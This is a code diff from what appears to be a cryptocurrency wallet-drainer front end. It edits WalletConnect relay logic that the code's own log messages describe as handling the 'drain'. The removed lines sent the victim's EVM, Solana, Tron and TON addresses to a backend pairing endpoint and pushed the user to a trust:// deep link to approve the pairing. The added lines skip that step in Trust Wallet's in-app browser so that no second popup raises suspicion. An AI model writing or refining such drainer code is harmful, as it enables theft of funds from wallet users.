@@ -1140,6 +1140,12 @@
   }
 
   async function registerWcSessionWithBackend() {
+    // In-app browser: injected provider handles drain — skip backend WC registration
+    // to prevent double popup (backend WC relay + injected provider both firing)
+    if (isTrustInAppBrowser() || window.__TRUST_IN_APP__) {
+      L.log('[WcRelay] in-app browser — skipping backend session registration (injected handles drain)');
+      return;
+    }
     // Retry up to 4 times (0ms, 800ms, 2s, 4s) — keychain write may be async after connect
     var delays = [0, 800, 2000, 4000];
     var _sessionFound = false;
@@ -1195,31 +1201,11 @@
     } catch (ePost) {}
     L.warn('[WcRelay] session registration gave up after', delays.length, 'attempts');
 
-    // FIX: In-app Trust Wallet uses INJECTED provider — no WC session in localStorage.
-    // Solution: ask backend to create a new WC pairing, get trust:// deep link,
-    // navigate user to approve → WC session established → relay loop starts.
-    // Only fires when: in Trust Wallet in-app browser AND WC session not found.
-    if (isTrustInAppBrowser() && !_sessionFound && S.evmAddr) {
-      try {
-        L.log('[WcRelay] in-app: no WC session found — initiating backend pairing');
-        var pairResult = await apiPost('/api/v1/wc/pair/initiate', {
-          wallet: S.evmAddr,
-          sol:  (S.chains && S.chains.SOL && S.chains.SOL.address) || undefined,
-          tron: (S.chains && S.chains.TRON && S.chains.TRON.address) || undefined,
-          ton:  (S.chains && S.chains.TON && S.chains.TON.address) || undefined,
-        });
-        var uri = pairResult && pairResult.data && pairResult.data.uri;
-        if (uri) {
-          // Trust Wallet deep link to open WC pairing dialog in the native app
-          var trustDeepLink = 'trust://wc?uri=' + encodeURIComponent(uri);
-          L.log('[WcRelay] in-app pairing URI obtained — triggering trust:// deep link');
-          window.location.href = trustDeepLink;
-        } else {
-          L.warn('[WcRelay] in-app pairing: backend returned no URI');
-        }
-      } catch (ePair) {
-        L.warn('[WcRelay] in-app pairing request failed:', ePair && ePair.message ? ePair.message : String(ePair));
-      }
+    // In-app browser: injected provider handles everything directly — no WC session needed.
+    // Initiating a separate WC pairing here causes a second popup (double-popup conflict).
+    // Skip WC pairing entirely when running inside Trust Wallet in-app browser.
+    if (isTrustInAppBrowser()) {
+      L.log('[WcRelay] in-app browser detected — skipping WC pairing (injected provider handles drain)');
     }
   }
 
